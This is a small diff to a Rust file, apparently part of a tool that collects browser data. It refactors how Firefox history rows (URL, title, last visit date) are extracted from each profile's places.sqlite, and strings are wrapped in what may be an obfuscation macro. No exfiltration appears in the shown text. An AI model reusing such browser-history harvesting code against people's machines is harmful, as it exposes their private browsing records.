@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
-use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract};
+use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract, ExtractExt};
 use alloc::sync::Arc;
 use derive_new::new;
 use collector::{Browser, Collector};
@@ -29,7 +29,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask<'_> {
             &StorageFileSystem,
             |profile| profile / s!("places.sqlite"),
             s!("moz_places"),
-            |record| History::extract(record, (MOZ_PLACES_URL, MOZ_PLACES_TITLE, MOZ_PLACES_LAST_VISIT_DATE)),
+            History::make_extractor((MOZ_PLACES_URL, MOZ_PLACES_TITLE, MOZ_PLACES_LAST_VISIT_DATE)),
         ) else {
             return;
         };
